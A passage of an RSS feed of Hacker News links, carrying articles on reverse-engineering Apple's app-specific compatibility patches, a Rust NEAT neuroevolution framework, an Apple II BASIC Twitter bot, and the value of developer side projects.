  <li>Fujitsu ScanSnap</li>
</ul>

<p>Apple Internal apps:</p>
<ul>
  <li><code>com.apple.ist.Merlin</code></li>
  <li><code>com.apple.ist.Radar7</code> (probably the most ironic)</li>
  <li><code>com.apple.ist.SoftwareDepot.Checker</code></li>
  <li><code>com.apple.ist.appledirectory4</code></li>
  <li><code>com.apple.ist.hr.Merlin</code></li>
</ul>

<p>and many other apps I haven’t heard of.</p>

<p>The breadth of software is staggering, and shows how much testing Apple must do to discover these bugs. (instead of testing for, say, the click-to-root bug in High Sierra ;) )</p>

<h2 id="what-a-patch-looks-like">What a patch looks like</h2>

<p>The patches don’t change behaviour drastically. They aren’t as crazy as the Windows backward compatibility patches <a href="https://blogs.msdn.microsoft.com/oldnewthing/">Raymond Chen</a> writes about. The patch to <code>NSOpenGLContext.currentContext()</code>, for example, is very simple: here’s the IDA graph view of the function.</p>

<p><img src="https://worthdoingbadly.com/assets/blog/appkitcompat/nsopenglcontext.png" width="797"></p>

<p>My attempt at translating it to pseudocode makes it clear that the only compatibility change is adding an <code>autoreleasepool</code>:</p>

<div><div><pre><code>class NSOpenGLContext {
    class func currentContext() -&gt; NSOpenGLContext {
        if __CFAppVersionCheckLessThan("com.microsoft.Powerpoint", CFSystemVersionYosemite) {
            autoreleasepool {
                let cglContext = _CGLGetCurrentContext();
                pthread_mutex_lock(__NSOpenGLContextToCGLContextObjMapLock)
                let context = __NSOpenGLContextToCGLContextObjMap[cglContext]
                pthread_mutex_unlock(__NSOpenGLContextToCGLContextObjMapLock)
                return context
            }
        } else {
            // no autorelease pool!
            let cglContext = _CGLGetCurrentContext();
            pthread_mutex_lock(__NSOpenGLContextToCGLContextObjMapLock)
            let context = __NSOpenGLContextToCGLContextObjMap[cglContext]
            pthread_mutex_unlock(__NSOpenGLContextToCGLContextObjMapLock)
            return context
        }
    }
}
</code></pre></div></div>

<p>Other patches are similarily small: the Dragon Age 2 patch @b3ll found makes <a href="https://developer.apple.com/documentation/foundation/bundle/1519901-image"><code>-[NSBundle imageForResource:]</code></a> call <code>-[Bundle pathForImageResource:</code> instead of <code>Bundle URLsForImageResource:]</code>, and creates the image using the file instead of the URLs.</p>

<h2 id="stuff-i-noticed-in-the-list-of-apps">Stuff I noticed in the list of apps</h2>

<p>Microsoft Excel/PowerPoint/Word have a patch in <code>_CFArraySortValues</code> to change the sorting algorithm slightly. How do you break sorting?!</p>

<p>25 apps had <a href="https://indiestack.com/2016/10/window-tabbing-pox/">automatic tabbing</a> (introduced in Sierra) disabled using the compatibility feature.</p>

<p>Some compatiblity patches only affects apps from one company: for example,  <code>_NSSavePanelUseLocalhostURLsDefaultValueFunction</code> fixes the save panel for a bunch of Adobe apps.</p>

<p>Other compatibility patches affect apps from many different developers: for example, <code>NSTableView</code> related patches affected apps from HP Installer to Sketch to TeamViewer, demonstrating that Tables Are Hard<sup>TM</sup>.</p>

<p>Photoshop and VectorWorks CAD have Touch Bar API patches: The Touch Bar API is so new that I’m surposed there’s already compatibility issues.</p>

<p>Most of the preference methods are named after the behaviours they change, but Eclipse, VMWare, Dragon Age 2, Apple Keynote, Apple Motion, and the Microsoft Office suite have the dubious honour of getting patch methods specifically named after them.</p>

<p>On the list, there are system apps such as <code>com.apple.loginwindow</code>: why would they need compatibility patches?! I guess Apple’s using the compatibility system to patch other things/change behaviour for specific system apps. Shouldn’t that be done via, say, method swizzling by the app itself, instead of in the framework?</p>

<p>Some patches seems to turn on slower code paths: for example, 12 apps are checked in <code>_NSCGSIsSynchronousM7DefaultValueFunction</code>, which likely slows down Core Graphics by using a synchronous method. This is a great use of backwards compatibility: it allows almost every app to run faster on a newer OS, but still prevent issues in a few applications.</p>

<h2 id="what-if-my-app-is-on-the-list">What if my app is on the list?</h2>

<p>There are two reactions when someone finds their own app was fixed by Apple:</p>

<p>Reaction 1: from the developer of Comic Life</p>

<blockquote>
  <p>@0xced Not sure if I should feel honored or ashamed to be on that list</p>

  <p>Airy (@aa10), <a href="https://twitter.com/aa10/status/429902613526904832">February 2, 2014</a></p>
</blockquote>

<p>Reaction 2: from the developer of Textual IRC</p>

<blockquote>
  <p>Fuck NSBundle</p>

  <p>emsquared committed on <a href="https://github.com/Codeux-Software/Textual/commit/f218b6444cefae56576c3cef0ca40b977713604a#diff-6b21bb57b24f0261b8af06bac36a52af">Jul 7, 2014</a></p>
</blockquote>

<p>The Textual IRC example is actually very interesting, because I was able to find the commit that fixed the bug just by looking at the patch:</p>

<p><img src="https://worthdoingbadly.com/assets/blog/appkitcompat/nsbundle_unload.png" width="594"></p>

<p>This patch disables <code>NSBundle.unload()</code> entirely, so that code wouldn’t get unloaded. I simply searched for NSBundle in Textual’s source, and actually found the <a href="https://github.com/Codeux-Software/Textual/commit/f218b6444cefae56576c3cef0ca40b977713604a#diff-6b21bb57b24f0261b8af06bac36a52af">commit</a> that fixed the issue.</p>

<p>Textual’s plugin system deactivated plugins by first unloading the plugin bundle, then calling an unload handler on the plugin. Of course, with the new NSBundle implementation, the unload handler’s code would be gone after the bundle unload, and calling the handler would crash the app. The fix, of course, was to call the unload handler before deallocating the bundle.</p>

<p>It’s fascinating to see both sides of the application compat patch: how the bug manifested in the app, how it’s worked around by Apple, and finally how it’s fixed properly by the developer (after much cursing).</p>

<h2 id="what-about-ios">What about iOS?</h2>

<p>Surprisingly, iOS’s UIKit has <em>zero</em> bundle ID checks! Fixes are applied to all apps linked with old SDKs. However, 0xced found three bundle IDs in Foundation: I confirmed with</p>

<div><div><pre><code>strings -a "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/Library/CoreSimulator/Profiles/Runtimes/iOS.simruntime/Contents/Resources/RuntimeRoot/System/Library/Frameworks/Foundation.framework/Foundation" |grep "^com\."|sort
</code></pre></div></div>

<p>and found:</p>

<ul>
  <li>com.popcap.* - <a href="https://twitter.com/0xced/status/429725803858128897">0xced examined this:</a> it returns a random resource from <code>-[NSBundle pathForResource:ofType]</code></li>
  <li>com.ea.realracing3</li>
  <li>com.mackiev.</li>
  <li>com.stuckpixelinc.funnypictures (<a href="https://twitter.com/SlaunchaMan/status/429756162100051968">@SlaunchaMan</a> found that this app was the most popular app on the App Store… in 2009.)</li>
</ul>



<p>Extracting this data wasn’t hard: you can do this in an hour, without spending a dime.</p>

<p>I pulled this list using static analysis, since dynamic analysis (by putting a breakpoint on <code>__CFAppVersionCheckLessThan</code>) would require me to trigger every method containing a patch, which is impossible.</p>

<p>To conduct static analysis, I needed a scriptable disassembler.</p>

<p>I chose <a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">IDA Free 7.0</a>, since IDA’s the industry standard for reverse engineering, and the free version supports disassembling macOS frameworks.</p>

<p>First, I loaded <code>/System/Library/Frameworks/AppKit.framework/Appkit</code>, Foundation, and CoreFoundation into IDA Free.</p>

<p>Next, I needed a script that:</p>

<ul>
  <li>Looked for code that invokes <code>__CFAppVersionCheckLessThan</code>. These are called “xrefs” (cross-references) in IDA.</li>
  <li>for each xref:
    <ul>
      <li>find the argument passed into the function</li>
      <li>find one function that calls this function
        <ul>
          <li>since we want to know, for example, what function actually uses <code>_NSBundleRunningDragonAge2Inf104DefaultValueFunction</code>.</li>
          <li>(It’s <code>-[NSBundle …</code></li></ul></li></ul></li></ul></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://worthdoingbadly.com/appkitcompat/">https://worthdoingbadly.com/appkitcompat/</a></em></p>]]>
            </description>
            <link>https://worthdoingbadly.com/appkitcompat/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811460</guid>
            <pubDate>Sun, 17 Jan 2021 15:31:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Neat: Simple Neuroevolution Framework, in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811405">thread link</a>) | @todsacerdoti
<br/>
January 17, 2021 | https://sgolem.com/blog/neat-simple-neuroevolution-framework-in-rust | <a href="https://web.archive.org/web/*/https://sgolem.com/blog/neat-simple-neuroevolution-framework-in-rust">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A month or so ago I started working on a neural network implementation in Rust, from scratch. I wasnâ€™t interested in achieving the best performance, or having all the bells and whistles. I had a simple goal of understanding NEAT. For those of you that are not familiar with it, hereâ€™s a snippet from the Wikipedia ðŸ‘‡.</p><blockquote><p>a form of artificial intelligence that uses evolutionary algorithms to generate artificial neural networks, parameters, topology and rules</p></blockquote><p>What fascinated me is that the system starts from a totally random set of simple neural networks. Very often, the evolution finds the best architecture and weights in a relatively short amount of time. The first problem I wanted to solve was training the network to be a XOR gate. It managed to do that after a few days of me writing code and figuring out where the bugs were. I was very excited when I found out it evolved the output activation function to be a step function.  It figured out the outputs are always round numbers. All by itself. Wow.</p><p>Now, to cut the story short, I donâ€™t think Iâ€™ll spend more time on it as Iâ€™ve achieved my goal. It might be useful for somebody else so Iâ€™ve made it public. Hereâ€™s a short example.</p><h2><a href="#problem"></a>Problem</h2><p>If you do a Google search, or look on Youtube, youâ€™ll quickly find out what exactly is a cart pole balancing problem. There is a cart that can only go left and right in a 2D world. A pole is attached to the top of the cart. The goal is to balance the pole for as long as you can. Similar to what children do, balancing a broom in the hand. ðŸ§¹</p><div><p><img alt="cart and pole balancing" data-src="/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=1200&amp;q=75" data-srcset="/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=320&amp;q=75 320w, /_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=420&amp;q=75 420w, /_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=768&amp;q=75 768w, /_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=1024&amp;q=75 1024w, /_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=1200&amp;q=75 1200w" src="https://sgolem.com/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fd0dqkpgki2io%2F3GanTKKPFeHd3kKNfhdccJ%2Fef7c897ae7d89262065e4ac2a85d9277%2Fimage.png&amp;w=1200&amp;q=75"></p></div><p>I couldnâ€™t find any existing simulators for this environment so I wrote one myself. You can find its code in the repo that I will link at the end of the post.</p><h3><a href="#training"></a>Training</h3><p>Iâ€™ve tried to make it super easy to set up a problem, run the evolution, and get a champion neural network out of it. Hereâ€™s how to that for the cart pole problem.</p><p>There are only 3 arguments when creating a NEAT system:</p><ul><li>number of input neurons</li><li>number of output neurons</li><li>the fitness function that returns a <code>f64</code></li></ul><pre><code>let mut system = NEAT::new(4, 1, |network| {
    let num_simulations = 10;
    let max_steps = 1000;
    let mut env = CartPole::new();

    let mut steps_done = 0;
    let mut fitness = 0.;

    for _ in 0..num_simulations {
        env.reset();

        for _ in 0..max_steps {
            if env.done() {
                break;
            }

            let state = env.state();
            let network_output = network.forward_pass(state.to_vec());
            let env_input = f64::max(-1., f64::min(1., *network_output.first().unwrap()));

            env.step(env_input).unwrap();
            steps_done += 1;
        }

        fitness += env.fitness();
    }

    fitness / num_simulations as f64
});

system.set_configuration(Configuration {
    population_size: 100,
    max_generations: 500,
    stagnation_after: 50,
    node_cost: 1.,
    connection_cost: 1.,
    compatibility_threshold: 2.,
    ..Default::default()
});

system.add_hook(10, |generation, system| {
    println!(
        "Generation {}, best fitness is {}, {} species alive",
        generation,
        system.get_best().2,
        system.species_set.species().len()
    );
});

let (network, fitness) = system.start();</code></pre><p>After the system is created the configuration is tweaked for this specific problem. That should help the process to find the best neural networks faster.</p><p>In order to see what is happening Iâ€™ve added a simple â€œhookâ€� that runs every 10 generations and gives us some info about the current state.</p><p>Iâ€™ll omit the code that exports the neural network to a file, but you can find it in the repo. To run the training process on your machine navigate to the <code>examples/cart-pole/</code> dir and run:</p><pre><code>cargo run --release -- train</code></pre><h3><a href="#balancing-the-pole"></a>Balancing the pole</h3><p>After the training is complete youâ€™ll see a <code>network.bin</code> file is created. Weâ€™ll use that to instantiate the network in the simulation. To open the simulation run:</p><pre><code>cargo run --release -- visualize</code></pre><p>Now drag the <code>network.bin</code> file into the simulation window and watch what happens. Or if you are lazy, watch the video below.</p><p>Sometimes the network wonâ€™t be able to balance the pole. That happens because the starting parameters are generated randomly, and for some of them it just isnâ€™t possible to put the pole back up.</p><p>After a couple of seconds you should see the cart and the pole perfectly in the middle. The network can balance them for eternity. On the other hand, watching a stable system is boring, and for that Iâ€™ve added the ability to apply some â€œwindâ€� by pressing arrow keys.</p><h2><a href="#future"></a>Future</h2><p>I suppose I wonâ€™t spend more time on this. There are other things Iâ€™d like to try. Thereâ€™s a tiny possibility someone will find this useful. In that case Iâ€™ll be happy to chat about it, and potentially find some time if somebody wants to fund it. You can <a href="https://twitter.com/SGolemac">send me a message on Twitter</a>.</p><p>This is what I had in mind for the future, even though it probably wonâ€™t happen.</p><ul><li>Two poles balancing task example (started it in a different branch)</li><li>Recurrent connections</li><li>Extend the system so it works with both <code>f32</code> and <code>f64</code> (might improve performance)</li><li>HyperNEAT</li><li>FS NEAT (feature selection)</li></ul><p>All the code is now public and you can find it <a href="https://github.com/stjepangolemac/neat-rs">here</a>.</p><p>On to the next project ðŸ‘‹</p></div></div>]]>
            </description>
            <link>https://sgolem.com/blog/neat-simple-neuroevolution-framework-in-rust</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811405</guid>
            <pubDate>Sun, 17 Jan 2021 15:26:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple II Basic Bot]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25811294">thread link</a>) | @elvis70
<br/>
January 17, 2021 | https://atari8bitbot.com/apple-ii-bot/ | <a href="https://web.archive.org/web/*/https://atari8bitbot.com/apple-ii-bot/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article class="page" id="post-82">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Send a tweet with a short BASIC program to <a href="https://twitter.com/AppleIIBot">@AppleIIBot</a> and your program will run on an emulated Apple II computer. The bot will tweet you back with a video your program’s output!</p>



<figure></figure>



<p id="block-6d1426fc-dbf0-4f3b-8e79-3976ce3135a7">The bot accepts programs in AppleSoft BASIC, the version of BASIC that was included with the Apple II computer. The first version of BASIC (Beginners’ All-purpose Symbolic Instruction Code) was released in 1964. AppleSoft BASIC, released in 1978, added commands for using the Apple II’s graphics capabilities and other features. </p>



<p>To send your program to the bot, just start your code after @AppleIIBot. Don’t forget to hit RETURN before each new line of code.</p>



<p>You need to use (at least one) line number. Immediate mode is not supported. Don’t add RUN to the end, the bot takes care of that.</p>



<p><strong>Caveats, Warnings, and Disclaimers</strong></p>



<ul><li>If the BASIC parser can’t understand something about your program (for instance, if you forget to include line numbers) it simply won’t respond. On a real Apple II, BASIC would tell you if something was amiss. On Twitter, it really isn’t feasible. So if you don’t get a reply within three or four minutes, check your code a try again. Or ask for help — it is Twitter, after all.</li><li>The bot doesn’t support sound yet.</li></ul>



<p>You can learn the fundamentals of AppleSoft BASIC with Apple’s book <a href="https://archive.org/details/ATouchOfApplesoftBASIC/">A Touch Of Applesoft BASIC</a>. More experienced programmers who need a refresher might want to reference the <a href="https://archive.org/details/Applesoft_BASIC_Programming_Reference_Manual_Apple_Computer">Applesoft BASIC Reference Manual</a>. </p>



<p><strong>Bracket Directives</strong></p>



<p>By default, the bot starts running your program, lets it run for 3 seconds before starting to record the video. It records the video for 30 seconds. If you don’t like this standard recording behavior — for instance, if your program takes a long time to draw a fractal — you can change it with a directive at the start of your tweet.</p>



<p>The B directive tells the bot how many seconds to wait before Beginning to record. {B20} will let your program run for 20 seconds before recording begins. {B0} will start recording immediately. The maximum wait is currently 99 seconds.</p>



<p>The S directive tells the bot how many Seconds to record your program running. {S2} will will record it running for just 2 seconds. {S99} will record it for the maximum 99 seconds. If you’re going to tie up the bot for that long, make it good. </p>



<p>The {G} directive gives you an authentic, old-school green screen. The {A} directive gives you an authentic, old-school amber screen. Who needs all those fancy colors?</p>



<p>You can combine directives in one set of brackets, like this: {B30S25} or {GS5B5}</p>



<p>Direct questions about the bot to&nbsp;<a href="https://twitter.com/kaysavetz">Kay Savetz</a>.</p>



<figure></figure>



<figure></figure>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://atari8bitbot.com/apple-ii-bot/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811294</guid>
            <pubDate>Sun, 17 Jan 2021 15:14:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why should you have side projects?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811163">thread link</a>) | @scastiel
<br/>
January 17, 2021 | https://scastiel.dev/posts/2020-10-12-the-case-for-side-projects/ | <a href="https://web.archive.org/web/*/https://scastiel.dev/posts/2020-10-12-the-case-for-side-projects/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      <header>
<picture><source srcset="https://d33wubrfki0l68.cloudfront.net/8ed9e59fa9171bedb5ff4fb327bf920ccfe5e773/81443/posts/2020-10-12-the-case-for-side-projects/cover.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/d1a5cf1e8d354a2ce37e172d8f156a686f810f97/47af5/posts/2020-10-12-the-case-for-side-projects/cover.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/d467f667901d36924161069252fca20d502c08a2/2b196/posts/2020-10-12-the-case-for-side-projects/cover.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/5efbb475223732c264fae464f3f6f6b50932c65e/35387/posts/2020-10-12-the-case-for-side-projects/cover.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/60be2fefb70b22199f549f2728edeb7fdabcf3ee/addc3/posts/2020-10-12-the-case-for-side-projects/cover.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/9bb7e1f980d7a44c1e819d8462888b7f3e08b057/904d3/posts/2020-10-12-the-case-for-side-projects/cover.200.jpg 200w, https://d33wubrfki0l68.cloudfront.net/67b33e59f471a81bca51821ba6c00f265e63a2e3/5bbdd/posts/2020-10-12-the-case-for-side-projects/cover.450.jpg 450w, https://d33wubrfki0l68.cloudfront.net/bbde09b36975a82f005abe1f1ccb3b12e741c0bb/0f9d4/posts/2020-10-12-the-case-for-side-projects/cover.700.jpg 700w, https://d33wubrfki0l68.cloudfront.net/0063347c73592ff3f1aac2ba18314d0b11f69009/a4ff2/posts/2020-10-12-the-case-for-side-projects/cover.950.jpg 950w, https://d33wubrfki0l68.cloudfront.net/8ad72078d8ff6f485f45240a15d45179cbbfb6f0/bff71/posts/2020-10-12-the-case-for-side-projects/cover.1200.jpg 1200w" sizes="100vw" type="image/jpeg"><img src="https://scastiel.dev/posts/2020-10-12-the-case-for-side-projects/cover.jpg" alt="Why you should have side projects" height="1800" width="1200" loading="lazy"></picture>

<p><small>12 Oct 2020 — 6 min read</small></p>
</header>
<p>As a developer, you may have acquired some skills that you don’t find the time
to practice. Or you may want to learn new ones, but your daily job doesn’t give
you the opportunity.</p>
<p>Do you use a framework at work but are frustrated that you only use a tiny
portion of its features? Did you hear about a new language bringing everything
you’ve ever dreamed of but can’t use it at your job?</p>
<p>Side projects are an excellent way to solve these problems: they help you learn
new skills and consolidate the ones you already have but can’t find the way to
practice.</p>
<!-- <aside>
<p>This blog post is an extract from my book
<a href="https://theoutstanding.dev">The Outstanding Developer</a>’s third chapter,
dedicated to learning new skills. You can download a free sample, and if you
like it, purchase it for as little as $4.99. You would make me very happy and
give me much motivation for writing the next chapters 🙂</p>
<a class="book-container" href="https://theoutstanding.dev">
  <div class="book">
    <img alt="The Outstanding Developer" src="./new-book-cover.png"/>
  </div>
</a>
</aside> -->
<h2 id="what-to-do-as-a-side-project%3F">What to do as a side project?</h2>
<p>Learning skills related to your expertise, and yet not too far from it, can help
you go out of your comfort zone. For instance, learning front-end if you’re a
back-end developer, or mobile development if you’re a front-end developer.</p>
<p>A cool side project could be to develop an application but implement both the
back-end and front-end of it. You could also set up continuous integration and
delivery if you want to. Having some part of the project using skills you
already have will give you the confidence to start, and the goal of making
something from A to Z by yourself will provide you with the courage to continue.</p>
<p>Of course, this is not the only reason to start a side project. Side projects
are always a great way to learn, but not only learn technical skills. You may
use to work on a small part of a big project in your job, but with your side
project, you’ll need to have a global vision of the project: what is its
architecture? How will you publish it? How will you maintain it? With your
project, you’re the chief.</p>
<h2 id="two-categories-of-side-projects">Two categories of side projects</h2>
<p>It’s best to know what is the goal of your side project. I can put my side
projects into two categories:</p>
<ul>
<li>The ones that I do to learn or reinforce a skill (learn a new language,
experiment with a new framework) and for which I mostly don’t care about
whether they’ll be used or not;</li>
<li>The ones I do because I had an idea or found a problem I think I’m able to
solve, and for which the technical aspect is not the priority (for these, the
best technical stack is the one you know best).</li>
</ul>
<p>Both categories of side projects will teach you something. Even if you already
master the stack you use, using it in a new project is always valuable. And
putting yourself in the shoes of a potential user is something you can forget in
a professional environment, where too many times there are too many
intermediaries between us developers and the final user. Again, in your project,
you’re in charge of everything, including understanding your users’ needs.</p>
<figure><picture><source srcset="https://d33wubrfki0l68.cloudfront.net/5e4926c1c42e53da15ef0e18765bede706ad8fb1/9ef27/posts/2020-10-12-the-case-for-side-projects/architect.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/6733736db2151910d7f6d43d47c83c23d7694d98/d91ac/posts/2020-10-12-the-case-for-side-projects/architect.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/2e71bcd38395e9ced3008e77cd1b5e9e7915166b/125e7/posts/2020-10-12-the-case-for-side-projects/architect.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/4c17e9e4c1f7ed7a2c2bf7097d4d3f7ab667cc29/bc3d8/posts/2020-10-12-the-case-for-side-projects/architect.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/add3d4090b308e0ac3a793a50ef2eb5b50eea929/63d0c/posts/2020-10-12-the-case-for-side-projects/architect.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/bd426215cfab5c5ff0553f3becf54b9e08d36052/3c8d9/posts/2020-10-12-the-case-for-side-projects/architect.200.jpg 200w, https://d33wubrfki0l68.cloudfront.net/7f4a7926b32c57cc7c51230353d0728144eb93f9/5c234/posts/2020-10-12-the-case-for-side-projects/architect.450.jpg 450w, https://d33wubrfki0l68.cloudfront.net/7049430840b0998fe3ab1b7e9538aa99d4e44f3c/b81be/posts/2020-10-12-the-case-for-side-projects/architect.700.jpg 700w, https://d33wubrfki0l68.cloudfront.net/36439da1d86147ed725b8822f983653e5df1f8ac/7a5bb/posts/2020-10-12-the-case-for-side-projects/architect.950.jpg 950w, https://d33wubrfki0l68.cloudfront.net/ae37b0599ea84cbc7f3f54c0f1112826c7613780/9aacb/posts/2020-10-12-the-case-for-side-projects/architect.1200.jpg 1200w" sizes="100vw" type="image/jpeg"><img src="https://scastiel.dev/posts/2020-10-12-the-case-for-side-projects/architect.jpg" alt="" height="675.2" width="1200" loading="lazy"></picture><figcaption>Photo by <a href="https://unsplash.com/@d_mccullough">Daniel McCullough</a></figcaption></figure>
<p>So even if you’re doing your side project to learn a technical skill, it’s okay
if this skill is just a small part of the project. Imagine you want to learn how
to use a new state management library for a web application. Of course, the
state management library doesn’t make the whole project; you’ll still need a UI
layer, maybe a back-end, etc. Perhaps using the state management library will
take you only 10% of your time. But it’s okay: using the library and learning
how it works in a real project is far more valuable than just following a
tutorial.</p>
<p>But if you want your side projects to be useful (both for what they teach you
and for its potential users), there is something you must do: release them.</p>
<h2 id="a-vital-thing-to-do%3A-release-your-side-projects">A vital thing to do: release your side projects</h2>
<p>Publish them. Make them available to some users. Not necessarily to the whole
world, but at least make some of your friends use it. First because when working
on your project, the simple goal of having some users will encourage you to
focus on what is important to them, more than spending time on the details
(which would be the best way to abandon your project in the middle). Then,
because even if your project is not that ambitious, you may have a good surprise
if it has a little success. Again a huge motivation to keep working on it.</p>
<figure><picture><source srcset="https://d33wubrfki0l68.cloudfront.net/2a2fe5615294a0fc9e1001cc4c808bef48858af0/931e9/posts/2020-10-12-the-case-for-side-projects/balloons.200.webp 200w, https://d33wubrfki0l68.cloudfront.net/9fd0ee7ce214d8c57e1103153f8284921e80faaf/4f512/posts/2020-10-12-the-case-for-side-projects/balloons.450.webp 450w, https://d33wubrfki0l68.cloudfront.net/5f8291fe1afcbca32832b945a1cb821aa14ea862/bd09e/posts/2020-10-12-the-case-for-side-projects/balloons.700.webp 700w, https://d33wubrfki0l68.cloudfront.net/863544b954857aa7f83b766e24cac1d8a5de1f67/fe728/posts/2020-10-12-the-case-for-side-projects/balloons.950.webp 950w, https://d33wubrfki0l68.cloudfront.net/25ad985dc209548d7c25cbefbc808f72eb90870e/c6900/posts/2020-10-12-the-case-for-side-projects/balloons.1200.webp 1200w" sizes="100vw" type="image/webp"><source srcset="https://d33wubrfki0l68.cloudfront.net/672da67c2881df88c92b9fe1d70e92fa026ea433/ca3b2/posts/2020-10-12-the-case-for-side-projects/balloons.200.jpg 200w, https://d33wubrfki0l68.cloudfront.net/294445a1d07dbc2437b1829c686e138960acd991/c40dc/posts/2020-10-12-the-case-for-side-projects/balloons.450.jpg 450w, https://d33wubrfki0l68.cloudfront.net/d2615c444339d08f16dd623a41bbd68cf161bdb9/430ba/posts/2020-10-12-the-case-for-side-projects/balloons.700.jpg 700w, https://d33wubrfki0l68.cloudfront.net/b38d41ba237b8b134bd4273ac0eea05ab3622abd/e69ac/posts/2020-10-12-the-case-for-side-projects/balloons.950.jpg 950w, https://d33wubrfki0l68.cloudfront.net/4b3924396f34faefe3c33ec571c276c854181fcb/76227/posts/2020-10-12-the-case-for-side-projects/balloons.1200.jpg 1200w" sizes="100vw" type="image/jpeg"><img src="https://scastiel.dev/posts/2020-10-12-the-case-for-side-projects/balloons.jpg" alt="" height="800" width="1200" loading="lazy"></picture><figcaption>Photo by <a href="https://unsplash.com/@lucistan">Luca Upper</a></figcaption></figure>
<p>So a good idea to approach your side project from the beginning would be to
start small. Your first goal should be to release something usable, even if all
the features are not present. In other words, focus on making a <em>Minimal Viable
Product (MVP)</em>: the smallest application that solves the user’s problem. When
this MVP is ready and published to some users, you’ll have plenty of time to add
other features or make your application beautiful. (A classic problem
encountered in side projects is focusing too much on the user interface. Yes, it
is essential, but not as much as the main feature itself. Unless, of course,
your application’s main advantage against its concurrence is revolutionary user
experience.)</p>
<h2 id="the-main-advantage-of-side-projects">The main advantage of side projects</h2>
<p>In his blog post
<a href="https://buffer.com/resources/side-projects-creative-hobbies/"><em>The Science of Side Projects</em></a>,
Kevan Lee (VP of marketing at Buffer) explains how side projects are great
because they have three characteristics that make them differ from work
projects:</p>
<ul>
<li>you don’t have to succeed to have money to live;</li>
<li>you decide on the timeline, having no imperatives such as a deadline;</li>
<li>you work on them because you like them, not because you have to.</li>
</ul>
<p>It brings me to the final advantage I see in side projects, and probably the
most important one. Yes, side projects will make you learn things. Yes, they
will help you in your career. But more importantly, they are what make us love
programming. In many professions, even if you love what you do, what you do at
your job can only be done at your job, if only for material reasons. With
programming, you can use what you know and master for personal projects, in the
best case, to help you solve problems you can have in your everyday life. And
for these projects, you can do what you want, take the risks you want, do them
when you want, and give them as much love as you want.</p>
<p>Now let’s be honest: no, not all of my side projects were released to the world.
Because the most important with a side project is to enjoy doing it, and
sometimes you realize you don’t love working on this idea you had as much as you
expected. So I have a massive list of projects that I started but never
finished. Sometimes it’s because I realized that my project wasn’t as
impressive/promising/realizable as I thought. Some other times I just lacked
time until another project idea came to my mind. But it doesn’t change the fact
that each time I start a project, my goal is to release it. And fortunately, it
still happens sometimes.</p>
<hr>
<p>Published or not, there is always something valuable about side projects. You
always learn something. In the best-case scenario, you learn the language or
framework you wanted to experiment with or reinforce what you already knew. In
the worst-case scenario, you realize that what you wanted to do can’t be
accomplished as quickly as you expected with the stack you chose. But in all
cases, what you did won’t have been done for nothing.</p>
<!-- Want to know more about learning new skills to become a better developer? Please
have a look at my work-in-progress book
[The Outstanding Developer](https://theoutstanding.dev). -->
<p><em>Cover photo by <a href="https://unsplash.com/@nate_dumlao">Nathan Dumlao</a>.</em></p>


    </article></div>]]>
            </description>
            <link>https://scastiel.dev/posts/2020-10-12-the-case-for-side-projects/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811163</guid>
            <pubDate>Sun, 17 Jan 2021 15:01:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Methods of Estimating Value of a Company]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811156">thread link</a>) | @alainchabat
